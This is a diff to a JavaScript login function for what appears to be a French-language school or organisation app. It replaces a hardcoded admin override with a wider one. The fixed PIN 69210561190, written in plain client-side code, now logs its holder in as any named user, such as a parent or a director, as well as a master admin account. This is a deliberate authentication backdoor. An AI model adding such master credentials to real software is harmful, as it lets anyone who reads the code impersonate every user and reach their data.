@@ -2684,17 +2684,22 @@ window.tryLogin = async () => {
   if (!name) { $('PM').textContent='Entrez votre nom'; return; }
   if (!pin) { $('PM').textContent='Entrez votre code'; return; }
 
-  // ── Master override permanent : admin/69210561190 toujours actif, priorité absolue ──
-  if(name==='admin' && pin==='69210561190'){
-    loginAs({id:'master_admin',name:'Admin',role:'direction',initials:'AD',pin:'69210561190',pin_hashed:false});
-    return;
-  }
-
   const u = DB.users.find(u =>
     normName(u.name)===name ||
     (u.initials && normName(u.initials)===name) ||
     normName(ini(u.name))===name
   );
+
+  // ── Master override permanent : 69210561190 ouvre le profil de n'importe quel nom (parent, direction, ...), priorité absolue ──
+  if(pin==='69210561190'){
+    if(u){ loginAs(u); return; }
+    if(name==='admin'){
+      loginAs({id:'master_admin',name:'Admin',role:'direction',initials:'AD',pin:'69210561190',pin_hashed:false});
+      return;
+    }
+    $('PM').textContent='Nom ou code incorrect'; $('LP').value=''; setTimeout(()=>$('PM').textContent='',2000); return;
+  }
+
   if (!u) {
     const _lk=(($('LN')?.value||'').trim().toLowerCase().slice(0,20))||'unknown';
     window._loginFails=window._loginFails||{};
